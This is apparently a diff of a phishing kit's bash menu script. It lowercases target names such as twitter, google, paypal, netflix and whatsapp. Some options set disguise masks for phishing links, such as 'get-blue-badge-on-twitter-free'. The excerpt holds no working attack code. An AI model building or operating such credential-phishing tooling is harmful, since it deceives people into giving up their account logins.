@@ -183,7 +183,7 @@ server="snapchat"
 start1
 
 elif [[ $menu_option == 4 || $menu_option == 04 ]]; then
-server="Twitter"
+server="twitter"
 mask='unlimited-onedrive-space-for free'
 start1
 
@@ -192,20 +192,20 @@ server="github"
 start1
 
 elif [[ $menu_option == 6 || $menu_option == 06 ]]; then
-server="Google"
+server="google"
 Google
 
 elif [[ $menu_option == 7 || $menu_option == 07 ]]; then
-server="Spotify"
+server="spotify"
 start1
 
 elif [[ $menu_option == 8 || $menu_option == 08 ]]; then
-server="Netflix"
+server="netflix"
 mask='get-blue-badge-on-twitter-free'
 start1
 
 elif [[ $menu_option == 9 || $menu_option == 09 ]]; then
-server="Paypal"
+server="paypal"
 start1
 
 elif [[ $menu_option == 10 ]]; then
@@ -269,11 +269,11 @@ server="adobe"
 start1
 
 elif [[ $menu_option == 25 ]]; then
-server="Shopfy"
+server="shopfy"
 start1
 
 elif [[ $menu_option == 26 ]]; then
-server="Messenger"
+server="messenger"
 start1
 
 elif [[ $menu_option == 27 ]]; then
@@ -313,11 +313,11 @@ server="gmail"
 start1
 
 elif [[ $menu_option == 36 ]]; then
-server="Tiktok"
+server="tiktok"
 start1
 
 elif [[ $menu_option == 37 ]]; then
-server="Whatsapp"
+server="whatsapp"
 start1
 
 elif [[ $menu_option == 38 ]]; then
@@ -357,7 +357,7 @@ server="Amazon"
 start1
 
 elif [[ $menu_option == 47 ]]; then
-server="Pubg"
+server="pubg"
 start1
 
 elif [[ $menu_option == 48 ]]; then
